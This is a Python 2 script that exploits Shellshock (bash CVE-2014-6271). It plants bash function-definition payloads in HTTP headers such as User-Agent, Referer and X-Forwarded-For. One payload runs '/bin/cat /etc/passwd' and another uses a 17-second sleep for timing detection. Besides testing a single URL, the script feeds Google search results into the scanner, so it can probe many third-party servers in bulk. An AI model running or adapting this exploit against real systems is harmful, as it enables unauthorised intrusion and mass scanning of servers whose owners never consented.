#!/usr/bin/env python
# -*- encoding: utf-8 -*-
# writted by brock@wooyun

import urllib2
import sys
import getopt
from utils import google
from utils import webutils
import time

resultCount = 20
beginNumber = 0
waitTime = 0.0

EXPLOIT1 = '() { :;};a=`/bin/cat /etc/passwd`;echo $a'
EXPLOIT2 = '() { :;};sleep 17'

def testBashShock1(url):
	opener = urllib2.build_opener()
	webutils.setupOpener(opener)
	req = urllib2.Request(url)
	req.add_header('Proxy-Connection', 'keep-alive')
	req.add_header('Cache-Control', 'max-age=0')
	req.add_header('X-Test', EXPLOIT1)
	req.add_header('User-Agent', EXPLOIT1)
	req.add_header('Referer',  EXPLOIT1)
	req.add_header('X-Forwarded-For',  EXPLOIT1)
	print '******* ' + url + ' *******'
	try:
		response = opener.open(req)
		if response:
			if response.info().getheader('root'):
				print
				print 'PANIC!!!'
				print
				print 'root:' + response.info().getheader('root')
			#for k, v in response.info().items():
			#	print k + ': ', v
	except Exception, e:
	   print 'Exception: ', e

def testBashShock2(url):
	opener = urllib2.build_opener()
	webutils.setupOpener(opener)
	req = urllib2.Request(url)
	req.add_header('Proxy-Connection', 'keep-alive')
	req.add_header('Cache-Control', 'max-age=0')
	req.add_header('X-Test', EXPLOIT2)
	req.add_header('User-Agent', EXPLOIT2)
	req.add_header('Referer',  EXPLOIT2)
	req.add_header('X-Forwarded-For',  EXPLOIT2)
	print '******* ' + url + ' *******'
	try:
		t1 = time.time()
		response = opener.open(req, timeout = 30)
		t2 = time.time() - t1
		if t2 >= 17 and t2 < 30:
			print
			print 'PANIC!!!'
			print
	except Exception, e:
	   print 'Exception: ', e


opts, args = getopt.getopt(sys.argv[1:], "n:b:w:u:")
for op, value in opts:
	if op == '-n':
		resultCount = int(value)
	elif op == '-b':
		beginNumber = int(value)
	elif op == '-u':
		url = value
	elif op == '-w':
		waitTime = int(value)

opener = urllib2.build_opener()
webutils.setupOpener(opener)

if len(url) > 0:
	testBashShock1(url)
	testBashShock2(url)
	sys.exit(0)
#print resultCount
#print args[0]
i = 0
#import pdb
#pdb.set_trace()
for url in google.google(opener, args[0], resultCount, beginNumber):
	i += 1
	testBashShock2(url)
	if waitTime > 0:
		time.sleep(waitTime)

print i

